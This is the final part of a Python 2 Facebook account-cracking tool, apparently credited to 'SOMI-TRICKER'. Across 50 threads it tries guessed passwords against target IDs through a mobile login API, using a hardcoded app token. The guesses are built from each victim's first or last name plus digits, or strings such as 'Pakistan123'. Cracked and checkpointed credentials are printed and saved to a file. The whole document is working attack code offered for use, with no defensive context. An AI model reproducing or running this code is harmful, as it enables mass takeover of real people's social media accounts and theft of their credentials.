					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '123456'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = 'Pakistan123'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '786786'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'1234'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '12345678'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '1122'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'
				                                                                                                   print '\x1b[1;95m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;97m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)	
																	
															
		except:
			pass
		
	p = ThreadPool(50)
	p.map(main, id)
	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"
	print "  \033[1;93m⊱•─── Developed By SOMI-TRICKER─── •⊰" #Dev:SOMI-TRICKER
	print '\033[1;96m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 XP.py)↩\033[1;97m....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;93m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print """
\033[1;32m  ●▬▬▬▬๑۩۩๑▬▬▬▬▬●
▀█▀▐░░░░░░░░▐░░░░░░░░░░░░░░
░█░▐▀█░▀█▐▀█▐▐▀▐░█▐▀█▐░█░░░
░█░▐░█▐▀█▐░█▐▌░▐▄█▐░█▐░█░░░
░█░▐░█▐▄█▐░█▐▐▄▄▄█▐▄█▐▄█░░░ FOR  USING MY TOOL
\033[1;32m  ●▬▬▬▬๑۩۩๑▬▬▬▬▬●

\033[1;94m┏┓┏┓┊┊┊┊┊┊┊┊┊┊┊┊
\033[1;94m┃┗┛┣━━┳━━┳━━┳┓┏┓
\033[1;92m┃┛┗┃╭╮┃┛┛┃┗┗┃╰┛┃
\033[1;92m┃╰╯┃┗┛┃╰╯┃╰╯┣━╮┃
\033[1;96m┃┏┓┃┏┓┃┏━┫┏┳┻━╯┃
\033[1;96m┗┛┗┻┛┗┻┛┊┗┛┗━━━╯
Checkpoint ID Open After 7 Days
 Having Problem Whatsapp Me :NOT USING✯☠"""
	
	raw_input("\n\033[1;93m[\033[1;96mBack\033[1;93m]")
	menu()

if __name__ == '__main__':
	login()
